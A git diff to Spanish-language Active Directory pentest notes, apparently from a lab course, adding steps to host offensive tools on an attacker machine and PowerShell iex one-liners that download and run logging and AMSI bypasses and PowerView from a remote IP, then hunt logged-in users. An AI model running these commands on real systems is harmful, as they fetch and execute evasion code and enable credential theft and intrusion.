@@ -301,7 +301,23 @@ Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | 
 ```
 
 ##### DESDE UN EQUIPO EN PROPIEDAD
-Desde un equipo en propiedad deberemos de tener levantado *HSF* y tener publicado
+Desde un equipo en propiedad deberemos de tener levantado *HSF* y tener publicado *Invoke-PowerShellTCP.ps1*, *Amsi-Byp.txt*, *Loader.exe*, *PowerView.ps1*, *SafetyKatz.exe* y *sbloggingbypass.txt*
+ y ejecutar bypass correspondientes
+ ```shell
+ iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/sbloggingbypass.txt')
+
+iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Amsi-Byp.txt')
+
+iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/PowerView.ps1')
+ ```
+
+Buscaremos ususarios conectados
+```shell
+Find-DomainUserLocation
+```
+
+
+
 #### Uncosntrained delegation
 Buscaremos equipos que tengan *Unconstrained delegation*
 ```shell
